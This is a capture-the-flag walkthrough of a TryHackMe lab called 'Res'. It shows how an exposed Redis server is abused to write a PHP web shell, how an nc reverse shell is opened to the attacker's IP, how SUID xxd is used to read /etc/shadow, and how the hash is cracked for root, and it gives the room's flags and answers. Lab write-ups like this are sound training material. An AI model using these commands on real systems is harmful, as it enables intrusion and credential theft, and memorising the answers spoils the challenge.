# Res

Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!

[Res](https://tryhackme.com/room/res)

## Topic's

- Redis (RCE)
- Security Misconfiguration
- Abusing SUID/GUID
- Brute Forcing (Hash)
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Resy Set Go

Are you ready to take the challenge?
The machine may take up to 2 minutes to boot and configure

1. Scan the machine, how many ports are open?

```
kali@kali:~/CTFs/tryhackme/Res$ sudo nmap -A -Pn -sS -sC -sV -p- --script vuln 10.10.116.10
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 20:52 CEST
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.116.10
Host is up (0.040s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners:
|   cpe:/a:apache:http_server:2.4.18:
|       CVE-2020-11984  7.5     https://vulners.com/cve/CVE-2020-11984
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
|       CVE-2019-10097  6.0     https://vulners.com/cve/CVE-2019-10097
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       CVE-2016-5387   5.1     https://vulners.com/cve/CVE-2016-5387
|       CVE-2020-9490   5.0     https://vulners.com/cve/CVE-2020-9490
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-17189  5.0     https://vulners.com/cve/CVE-2018-17189
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740
|       CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993
|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
|_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
6379/tcp open  redis   Redis key-value store 6.0.7
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/12%OT=80%CT=1%CU=32016%PV=Y%DS=2%DC=T%G=Y%TM=5F84A7
OS:A1%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   36.07 ms 10.8.0.1
2   36.61 ms 10.10.116.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 406.80 seconds
```

`2`

2. What's is the database management system installed on the server?

`6379/tcp open redis Redis key-value store 6.0.7`

`Redis`

3. What port is the database management system running on?

`6379`

4. What's is the version of management system installed on the server?

`6.0.7`

5. Compromise the machine and locate user.txt

```
kali@kali:~/CTFs/tryhackme/Res$ nc -v 10.10.116.10 6379
10.10.116.10: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.116.10] 6379 (?) open
INFO
$3676
# Server
redis_version:6.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:5c906d046e45ec07
redis_mode:standalone
os:Linux 4.4.0-189-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:5.4.0
process_id:581
run_id:d9959e542969ebcb8f4b726dcae8b7a6e8b157f6
tcp_port:6379
uptime_in_seconds:656
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:8693827
executable:/home/vianka/redis-stable/src/redis-server
config_file:/home/vianka/redis-stable/redis.conf
io_threads_active:0

# Clients
connected_clients:1
client_recent_max_input_buffer:4
client_recent_max_output_buffer:0
blocked_clients:0
tracking_clients:0
clients_in_timeout_table:0

# Memory
used_memory:588016
used_memory_human:574.23K
used_memory_rss:4870144
used_memory_rss_human:4.64M
used_memory_peak:588016
used_memory_peak_human:574.23K
used_memory_peak_perc:100.00%
used_memory_overhead:541524
used_memory_startup:524536
used_memory_dataset:46492
used_memory_dataset_perc:73.24%
allocator_allocated:968712
allocator_active:1253376
allocator_resident:3489792
total_system_memory:1038393344
total_system_memory_human:990.29M
used_memory_lua:37888
used_memory_lua_human:37.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.29
allocator_frag_bytes:284664
allocator_rss_ratio:2.78
allocator_rss_bytes:2236416
rss_overhead_ratio:1.40
rss_overhead_bytes:1380352
mem_fragmentation_ratio:8.93
mem_fragmentation_bytes:4324656
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:16988
mem_aof_buffer:0
mem_allocator:jemalloc-5.1.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1602528691
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
module_fork_in_progress:0
module_fork_last_cow_size:0

# Stats
total_connections_received:2
total_commands_processed:1
instantaneous_ops_per_sec:0
total_net_input_bytes:19
total_net_output_bytes:3681
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
expire_cycle_cpu_milliseconds:12
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
tracking_total_keys:0
tracking_total_items:0
tracking_total_prefixes:0
unexpected_error_replies:0
total_reads_processed:3
total_writes_processed:1
io_threaded_reads_processed:0
io_threaded_writes_processed:0

# Replication
role:master
connected_slaves:0
master_replid:2b3c03fdbfc80e41b99fc80406b4689e8f8000de
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.000000
used_cpu_user:0.752000
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

# Modules

# Cluster
cluster_enabled:0

# Keyspace
```

[Redis RCE](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#redis-rce)

```
kali@kali:~/CTFs/tryhackme/Res$ redis-cli -h 10.10.116.10
10.10.116.10:6379> config set dir /var/www/html
OK
10.10.116.10:6379> config set dbfilename redis.php
OK
10.10.116.10:6379> set test "<?php phpinfo(); ?>"
OK
10.10.116.10:6379> save
OK
10.10.116.10:6379>
```

[http://10.10.116.10/redis.php](http://10.10.116.10/redis.php)

```
10.10.116.10:6379> config set dbfilename cmd.php
OK
10.10.116.10:6379> set test "<?php system($_GET['cmd']); ?>"
OK
10.10.116.10:6379> save
OK
10.10.116.10:6379>
```

[view-source:http://10.10.116.10/cmd.php?cmd=id;ifconfig](view-source:http://10.10.116.10/cmd.php?cmd=id;ifconfig)

```
REDIS0009�	redis-ver6.0.7�
redis-bits�@�ctimeº��_�used-mem�@E	 �aof-preamble� � �  testuid=33(www-data) gid=33(www-data) groups=33(www-data)
eth0      Link encap:Ethernet  HWaddr 02:cb:29:27:15:7d
          inet addr:10.10.116.10  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::cb:29ff:fe27:157d/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:67471 errors:0 dropped:0 overruns:0 frame:0
          TX packets:67086 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:3391500 (3.3 MB)  TX bytes:4859989 (4.8 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:178 errors:0 dropped:0 overruns:0 frame:0
          TX packets:178 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:13592 (13.5 KB)  TX bytes:13592 (13.5 KB)

�6/ �x`9
```

```
kali@kali:~/CTFs/tryhackme/Res$ nc -nlvp 9001
listening on [any] 9001 ...
```

`10.10.116.10/cmd.php?cmd=nc -e /bin/bash 10.8.106.222 9001`

```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ ls -la
ls -la
total 28
drwxrwxrwx 2 root   root    4096 Oct 12 12:08 .
drwxr-xr-x 3 root   root    4096 Sep  2 09:54 ..
-rw-r--r-- 1 vianka vianka   134 Oct 12 12:08 cmd.php
-rw-r--r-- 1 root   root   11321 Sep  2 09:54 index.html
-rw-r--r-- 1 vianka vianka   123 Oct 12 12:06 redis.php
www-data@ubuntu:/var/www/html$ cd /home
cd /home
www-data@ubuntu:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root   root   4096 Sep  1 17:02 .
drwxr-xr-x 22 root   root   4096 Sep  1 18:57 ..
drwxr-xr-x  5 vianka vianka 4096 Sep  2 13:52 vianka
www-data@ubuntu:/home$ cd vianka
cd vianka
www-data@ubuntu:/home/vianka$ ls -la
ls -la
total 44
drwxr-xr-x 5 vianka vianka 4096 Sep  2 13:52 .
drwxr-xr-x 3 root   root   4096 Sep  1 17:02 ..
-rw------- 1 vianka vianka 3550 Sep  2 14:12 .bash_history
-rw-r--r-- 1 vianka vianka  220 Sep  1 17:02 .bash_logout
-rw-r--r-- 1 vianka vianka 3771 Sep  1 17:02 .bashrc
drwx------ 2 vianka vianka 4096 Sep  1 17:47 .cache
drwxrwxr-x 2 vianka vianka 4096 Sep  2 10:04 .nano
-rw-r--r-- 1 vianka vianka  655 Sep  1 17:02 .profile
-rw-r--r-- 1 root   root   1069 Sep  2 09:31 .service: Failed with result start-limit-hit?
-rw-r--r-- 1 vianka vianka    0 Sep  1 17:47 .sudo_as_admin_successful
drwxrwxr-x 7 vianka vianka 4096 Sep  2 09:39 redis-stable
-rw-rw-r-- 1 vianka vianka   35 Sep  2 13:52 user.txt
www-data@ubuntu:/home/vianka$ cat user.txt
cat user.txt
thm{red1s_rce_w1thout_credent1als}
```

`thm{red1s_rce_w1thout_credent1als}`

6. What is the local user account password?

```
www-data@ubuntu:/home/vianka$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
vianka:x:1000:1000:Res,,,:/home/vianka:/bin/bash
www-data@ubuntu:/home/vianka$ cat /etc/shadow
cat /etc/shadow
cat: /etc/shadow: Permission denied
www-data@ubuntu:/home/vianka$ find / -type f -perm -u=s 2> /dev/null
find / -type f -perm -u=s 2> /dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/ping6
/bin/umount
/usr/bin/chfn
/usr/bin/xxd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
www-data@ubuntu:/home/vianka$
```

[https://gtfobins.github.io/gtfobins/xxd/#sudo](https://gtfobins.github.io/gtfobins/xxd/#sudo)

```
www-data@ubuntu:/home/vianka$ LFILE=/etc/shadow
LFILE=/etc/shadow
www-data@ubuntu:/home/vianka$ xxd "$LFILE" | xxd -r
xxd "$LFILE" | xxd -r
root:!:18507:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18506:0:99999:7:::
uuidd:*:18506:0:99999:7:::
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
www-data@ubuntu:/home/vianka$
```

```
kali@kali:~/CTFs/tryhackme/Res$ john vianka.hash /usr/share/wordlists/rockyou.txt --format=sha512crypt
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
beautiful1       (?)
1g 0:00:00:05 DONE 2/3 (2020-10-12 21:19) 0.1879g/s 1972p/s 1972c/s 1972C/s maryjane1..garfield1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```
www-data@ubuntu:/home/vianka$ su vianka
su vianka
Password: beautiful1

vianka@ubuntu:~$ sudo -l
sudo -l
[sudo] password for vianka: beautiful1

Matching Defaults entries for vianka on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL
vianka@ubuntu:~$ sudo su
sudo su
root@ubuntu:/home/vianka# cd /root
cd /root
root@ubuntu:~# ls -la
ls -la
total 24
drwx------  3 root root 4096 Sep  2 13:52 .
drwxr-xr-x 22 root root 4096 Sep  1 18:57 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Sep  2 08:52 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   25 Sep  2 13:52 root.txt
root@ubuntu:~# cat root.txt
cat root.txt
thm{xxd_pr1v_escalat1on}
```

7. Escalate privileges and obtain root.txt

`thm{xxd_pr1v_escalat1on}`
